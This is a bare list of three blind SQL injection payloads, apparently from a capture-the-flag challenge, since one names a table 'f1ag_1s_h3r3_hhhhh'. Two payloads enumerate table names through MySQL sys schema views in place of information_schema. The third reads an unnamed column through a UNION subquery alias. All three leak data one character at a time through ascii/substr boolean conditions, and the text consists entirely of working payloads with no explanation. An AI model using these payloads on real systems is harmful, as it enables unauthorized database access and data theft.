if(ascii(substr((select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()),1,1))>1,1,2)

if(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),1,1))>1,1,2)


if(ascii(substr((SELECT group_concat(`2`) FROM (SELECT 1,2,3 UNION SELECT * FROM f1ag_1s_h3r3_hhhhh)as X),1,1))>1,1,2)